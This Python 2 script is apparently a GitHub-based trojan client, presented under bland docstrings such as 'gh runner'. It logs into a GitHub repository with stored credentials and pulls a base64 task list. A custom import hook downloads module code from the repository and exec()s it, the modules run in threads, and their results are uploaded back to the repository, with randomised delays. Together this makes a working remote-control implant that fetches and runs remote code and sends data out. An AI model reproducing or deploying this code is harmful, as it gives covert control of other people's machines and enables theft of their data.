#!/usr/bin/env python
'''gh runner'''

from my_conn import MY_GHC

import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

class GHWorker(object):
    '''help with all the gh'''
    def __init__(self, username, password, repo, repo_owner=None):
        self.id = 'abc'
        self.config_name = '%s.json' % self.id
        self.data_path = 'data/%s/' % self.id
        self.module_path = 'modules/'
        self.modules = []
        self.configured = False
        self.username = username
        self.repo_owner = repo_owner
        if self.repo_owner is None:
            self.repo_owner = self.username
        self.password = password
        self.repo_name = repo
        self.branch_name = 'master'
        self.commit_message = 'Commit message'
    def connect_to_github(self):
        '''connect to github'''
        ghconnection = login(username=self.username, password=self.password)
        repo = ghconnection.repository(self.repo_owner, self.repo_name)
        branch = repo.branch(self.branch_name)
        return (ghconnection, repo, branch)
    def get_file_contents(self, filepath):
        '''get contents of file'''
        _, repo, branch = self.connect_to_github()
        tree = branch.commit.commit.tree.recurse()

        for filename in tree.tree:
            if filepath in filename.path:
                print '[*] Found file %s' % filepath
                blob = repo.blob(filename._json_data['sha'])
                return blob.content
        return None
    def import_task_module(self, task):
        '''import the module in task'''
        module_name = task['module']
        if module_name not in sys.modules:
            exec('import %s' % module_name)
    def get_config(self):
        '''get config'''
        config_json = self.get_file_contents(self.config_name)
        config = json.loads(base64.b64decode(config_json))
        self.configured = True

        for task in config:
            self.import_task_module(task)
        return config
    def store_module_result(self, data):
        '''store the data'''
        try:
            remote_path = '%s%d.data' % (self.data_path, random.randint(1000, 100000))
            _, repo, _ = self.connect_to_github()
            repo.create_file(remote_path, self.commit_message, base64.b64encode(data))
            return
        except Exception as err:
            print str(err)

class GHImporter(object):
    '''import modules from gh'''
    def __init__(self, worker):
        self.current_module_code = ''
        self.worker = worker
    def find_module(self, fullname, path=None):
        '''find the specified module'''
        if self.worker.configured:
            print '[*] Attempting to retrieve %s' % fullname
            module_path = '%s%s' % (self.worker.module_path, fullname)
            new_library = self.worker.get_file_contents(module_path)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None
    def load_module(self, name):
        '''load module'''
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module
        return module
class Runner(object):
    '''main worker'''
    def __init__(self, username, password, repo, repo_owner=None):
        self.worker = GHWorker(username, password, repo, repo_owner)
        self.tasks = Queue.Queue()
    def module_runner(self, module):
        '''run the module'''
        self.tasks.put(1)
        mod = sys.modules[module]
        print str(mod)
        result = mod.run()
        # store the results
        self.worker.store_module_result(result)
        self.tasks.get()
        return
    def main(self):
        '''main loop'''
        sys.meta_path = [GHImporter(self.worker)]
        while True:
            if self.tasks.empty():
                config = self.worker.get_config()
                #self.runtask(config[0])
                for task in config: self.runtask(task)

        time.sleep(random.randint(1000, 10000))
    def runtask(self, task):
        '''run task in its own thread'''
        thr = threading.Thread(target=self.module_runner, args=(task['module'],))
        thr.start()
        time.sleep(random.randint(1, 10))

Runner(MY_GHC.uname, MY_GHC.pword, MY_GHC.repo_name, MY_GHC.repo_owner).main()
